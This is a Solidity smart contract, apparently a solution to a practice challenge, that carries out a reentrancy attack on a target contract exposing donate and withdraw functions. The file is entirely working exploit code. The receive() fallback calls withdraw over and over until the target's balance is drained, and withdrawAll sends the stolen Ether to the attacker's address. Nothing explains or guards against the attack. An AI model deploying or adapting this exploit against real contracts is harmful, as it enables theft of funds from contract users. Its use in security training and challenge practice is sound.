// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// contract interface
interface IReentrance {
  // function definition of the method we want to interact with
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract AttackReentrance {

  address payable public owner;
  IReentrance reentrance;
  uint256 private immutable i_amount = 1 * 1e15;

  constructor(address target) public payable {
    owner = payable(msg.sender);
    reentrance = IReentrance(target);
  }

  function balance() public view returns (uint) {
    return address(this).balance;
  }

  function donateAndWithdraw() public payable {
        require(msg.value >= i_amount);
        console.log("donateAndWithdraw");
        reentrance.donate{value: i_amount}(address(this));
        reentrance.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        bool sent = owner.send(totalBalance);
        // (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        console.log("withdrawAll");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(reentrance).balance;
        if (targetBalance >= i_amount) {
          reentrance.withdraw(i_amount);
        }
    }
}
